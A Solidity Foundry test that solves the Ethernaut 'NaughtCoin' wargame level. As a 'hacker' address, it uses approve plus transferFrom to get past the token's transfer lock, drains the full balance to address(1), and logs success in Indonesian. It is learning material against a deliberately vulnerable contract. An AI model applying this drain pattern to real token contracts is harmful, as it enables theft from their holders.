// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import "forge-std/Test.sol";

interface INaughtCoin {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
}

interface IEthernaut {
    function createLevelInstance(address _level) external payable;
    function submitLevelInstance(address _instance) external;
}

contract EthernautNaughtCoinTest is Test {
    IEthernaut ethernaut = IEthernaut(0xa3e7317E591D5A0F1c605be1b3aC4D2ae56104d6);
    address levelFactory = 0x80934BE6B8B872B364b470Ca30EaAd8AEAC4f63F;

    function testLevel15_NaughtCoin() public {
        address hacker = makeAddr("hacker");
        vm.startPrank(hacker); 
        vm.recordLogs();
        ethernaut.createLevelInstance(levelFactory);
        
        Vm.Log[] memory entries = vm.getRecordedLogs();
        bytes32 instanceTopic = entries[entries.length - 1].topics[2];
        address levelAddr = address(uint160(uint256(instanceTopic)));
        
        INaughtCoin coin = INaughtCoin(levelAddr);
        
        uint256 myBalance = coin.balanceOf(hacker);
        console.log("Saldo Awal Hacker:", myBalance);
        
        coin.approve(hacker, myBalance);
        
       address buangan = address(1);
        coin.transferFrom(hacker, buangan, myBalance);

        uint256 finalBalance = coin.balanceOf(hacker);
        console.log("Saldo Akhir Hacker:", finalBalance);
        
        assertEq(finalBalance, 0);
        console.log("HACKED! Saldo berhasil dikuras.");

        ethernaut.submitLevelInstance(levelAddr);
        vm.stopPrank();
    }
}